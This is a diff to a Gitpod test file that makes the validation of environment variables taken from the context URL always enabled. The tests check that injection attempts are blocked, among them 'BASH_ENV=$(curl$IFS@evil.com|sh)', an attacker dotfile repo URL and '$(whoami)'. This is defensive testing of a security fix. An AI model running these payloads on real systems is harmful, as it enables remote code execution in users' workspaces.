@@ -12,7 +12,6 @@ import * as chai from "chai";
 import { EnvvarPrefixParser, EnvvarSanitization } from "./envvar-prefix-context-parser";
 import { WithEnvvarsContext, User } from "@gitpod/gitpod-protocol";
 import { Config } from "../config";
-import { Experiments } from "@gitpod/gitpod-protocol/lib/experiments/configcat-server";
 const expect = chai.expect;
 
 @suite
@@ -104,27 +103,9 @@ class TestEnvvarPrefixParser {
         return this.parser.findPrefix(this.mockUser, url);
     }
 
-    // Security validation tests
+    // Security validation tests - validation is now always enabled
     @test
-    public async testSecurityValidationDisabled() {
-        Experiments.configureTestingClient({
-            context_env_var_validation: false,
-        });
-
-        expect(await this.parseAndFormat("BASH_ENV=dangerous/")).to.deep.equal({ BASH_ENV: "dangerous" });
-        // Note: URLs with / cannot work due to context URL parsing splitting on /
-        expect(await this.parseAndFormat("SUPERVISOR_DOTFILE_REPO=https://github.com/attacker/repo/")).to.deep.equal({
-            SUPERVISOR_DOTFILE_REPO: "https:",
-        });
-        expect(await this.parseAndFormat("VAR=value$/")).to.deep.equal({ VAR: "value$" });
-    }
-
-    @test
-    public async testSecurityValidationEnabled() {
-        Experiments.configureTestingClient({
-            context_env_var_validation: true,
-        });
-
+    public async testSecurityValidation() {
         // Auto-executing variables should be blocked
         expect(await this.parseAndFormat("BASH_ENV=anything/")).to.deep.equal({});
         expect(await this.parseAndFormat("SUPERVISOR_DOTFILE_REPO=repo/")).to.deep.equal({});
@@ -146,10 +127,6 @@ class TestEnvvarPrefixParser {
 
     @test
     public async testLegitimateValuesAllowedWithSecurity() {
-        Experiments.configureTestingClient({
-            context_env_var_validation: true,
-        });
-
         // Legitimate values should still work
         expect(await this.parseAndFormat("VERSION=1.2.3/")).to.deep.equal({ VERSION: "1.2.3" });
         expect(await this.parseAndFormat("DEBUG_LEVEL=info/")).to.deep.equal({ DEBUG_LEVEL: "info" });
@@ -163,10 +140,6 @@ class TestEnvvarPrefixParser {
 
     @test
     public async testMixedValidAndInvalidVariables() {
-        Experiments.configureTestingClient({
-            context_env_var_validation: true,
-        });
-
         // Mix of valid and invalid variables - only valid ones should be included
         expect(await this.parseAndFormat("VALID=good,BASH_ENV=bad,ANOTHER=also-good/")).to.deep.equal({
             VALID: "good",
@@ -181,10 +154,6 @@ class TestEnvvarPrefixParser {
 
     @test
     public async testCLC1591AttackVectorsBlocked() {
-        Experiments.configureTestingClient({
-            context_env_var_validation: true,
-        });
-
         // Original attacks from CLC-1591 should be blocked
         expect(await this.parseAndFormat("BASH_ENV=$(curl$IFS@evil.com|sh)/")).to.deep.equal({});
         expect(await this.parseAndFormat("SUPERVISOR_DOTFILE_REPO=https://github.com/attacker/repo/")).to.deep.equal(
@@ -199,10 +168,6 @@ class TestEnvvarPrefixParser {
 
     @test
     public async testURLDecodingInValidation() {
-        Experiments.configureTestingClient({
-            context_env_var_validation: true,
-        });
-
         // URL-encoded dangerous characters should still be blocked
         expect(await this.parseAndFormat("VAR=value%24/")).to.deep.equal({}); // %24 = $
         expect(await this.parseAndFormat("VAR=value%28/")).to.deep.equal({}); // %28 = (
@@ -218,10 +183,6 @@ class TestEnvvarPrefixParser {
 class TestEnvvarSanitization {
     @test
     public testAutoExecVariablesBlocked() {
-        Experiments.configureTestingClient({
-            context_env_var_validation: true,
-        });
-
         // Test shell execution variables
         expect(EnvvarSanitization.validateContextEnvVar("BASH_ENV", "anything")).to.deep.include({
             valid: false,
@@ -281,10 +242,6 @@ class TestEnvvarSanitization {
 
     @test
     public testPatternBasedBlocking() {
-        Experiments.configureTestingClient({
-            context_env_var_validation: true,
-        });
-
         // Test LD_* pattern
         expect(EnvvarSanitization.validateContextEnvVar("LD_CUSTOM", "value")).to.deep.include({
             valid: false,
@@ -360,10 +317,6 @@ class TestEnvvarSanitization {
 
     @test
     public testUnsafeCharactersBlocked() {
-        Experiments.configureTestingClient({
-            context_env_var_validation: true,
-        });
-
         // Test shell metacharacters
         expect(EnvvarSanitization.validateContextEnvVar("VAR", "value$")).to.deep.include({
             valid: false,
@@ -435,10 +388,6 @@ class TestEnvvarSanitization {
 
     @test
     public testInjectionPatternsBlocked() {
-        Experiments.configureTestingClient({
-            context_env_var_validation: true,
-        });
-
         // Note: Most injection patterns are caught by character whitelist first
         // Test command substitution - caught by unsafe chars ($ and ( not allowed)
         expect(EnvvarSanitization.validateContextEnvVar("VAR", "$(whoami)")).to.deep.include({
@@ -507,10 +456,6 @@ class TestEnvvarSanitization {
 
     @test
     public testLegitimateValuesAllowed() {
-        Experiments.configureTestingClient({
-            context_env_var_validation: true,
-        });
-
         // Test simple values
         expect(EnvvarSanitization.validateContextEnvVar("VERSION", "1.2.3")).to.deep.equal({
             valid: true,
@@ -554,10 +499,6 @@ class TestEnvvarSanitization {
 
     @test
     public testCLC1591AttackVectors() {
-        Experiments.configureTestingClient({
-            context_env_var_validation: true,
-        });
-
         // Original attack vectors from CLC-1591
         expect(EnvvarSanitization.validateContextEnvVar("BASH_ENV", "$(curl$IFS@evil.com|sh)")).to.deep.include({
             valid: false,
@@ -588,10 +529,6 @@ class TestEnvvarSanitization {
 
     @test
     public testGetBlockReasonDescription() {
-        Experiments.configureTestingClient({
-            context_env_var_validation: true,
-        });
-
         expect(EnvvarSanitization.getBlockReasonDescription("auto-exec")).to.equal(
             "Variable automatically executes code when set",
         );
@@ -608,10 +545,6 @@ class TestEnvvarSanitization {
 
     @test
     public testEdgeCases() {
-        Experiments.configureTestingClient({
-            context_env_var_validation: true,
-        });
-
         // Test very long variable names
         const longName = "A".repeat(1000);
         expect(EnvvarSanitization.validateContextEnvVar(longName, "value")).to.deep.equal({
